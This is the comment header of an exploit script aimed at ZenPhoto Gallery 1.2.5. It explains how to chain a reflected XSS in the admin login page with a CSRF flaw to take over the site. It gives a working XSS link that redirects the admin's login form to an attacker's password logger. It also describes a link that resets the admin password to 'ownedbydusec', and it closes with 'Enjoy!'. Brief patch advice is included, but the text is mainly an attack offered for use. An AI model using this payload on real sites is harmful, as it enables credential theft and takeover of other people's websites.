#     Zen Photo Adminstrator Password Steal/Reset Exploit          #
#+================================================================+#
#     Discovered and coded by petros [at] dusecurity.com           #
#+----------------------------------------------------------------+#
#     Affects: ZenPhoto Gallery 1.2.5		                   #
#+----------------------------------------------------------------+#
# Zenphoto is an answer to lots of calls for an online             #
# gallery solution that just makes sense. After years of           #
# bloated software that does everything and your dishes,           #
# zenphoto just shows your photos, simply. Itâ€™s got all the        #
# functionality and â€œfeaturesâ€ you need, and nothing you donâ€™t.    #
# Where the old guys put in a bunch of modules and junk, we put    #
# a lot of thought. We hope you agree with our philosopy:          #
# simpler is better. Donâ€™t get us wrong though â€“zenphoto really    #
# does have everything you need for your online gallery.           #

#                                                                  #
# This exploit actually advantage of two vulnerabilities.          #
# The first exploit is a simple XSS in the admin login page        #
# that will allow us to log the admins password. Unfortunatly,     #
# it only executes if the admin is NOT already logged in.          #
# The second is a CRSF exploit that allows you to change the       #
# admins password by automatically submitting a form.              #
# This exploit only works if the admin already logged in.          #
# Combine these and we have two ways to gain admin access          #
#                                                                  #

#                                                                  #
# The XSS in the zp-core/admin.php page can be patched by          #
# santizing the $_GET['from'] variable before outputting it        #
#                                                                  #
# The CRSF requires either some form of referal checking or        #
# hidden security token on all forms (the latter would be better   #
#                                                                  #

# How to use this exploit to take over a ZenPhoto website          #
#+----------------------------------------------------------------+#
#                                                                  #
# To use the XSS logger make the admin click this link:            #
#                                                                  #
#+--[code snippet - put this all in one line]--+                   #
# http://victimsite.com/zp-core/admin.php?from="><script>          #
# document.forms[0].action="[logged url]";                         #
# </script><div id="lolpwnt                                        #
#+--[ end of code snippet]--+                                      #
#                                                                  #
# Replace [logger url] with the link to this PHP script            #
# Make sure your log.txt is writable before doing this             #
# On login the admins password will be saved to the file.          #
#                                                                  #
# The next exploit is used by simply giving the link to            #
# this script to the admin. if he clicks it his password           #
# will be changed automatically to "ownedbydusec"                  #
#                                                                  #
# That's about it :) Enjoy!                                        #
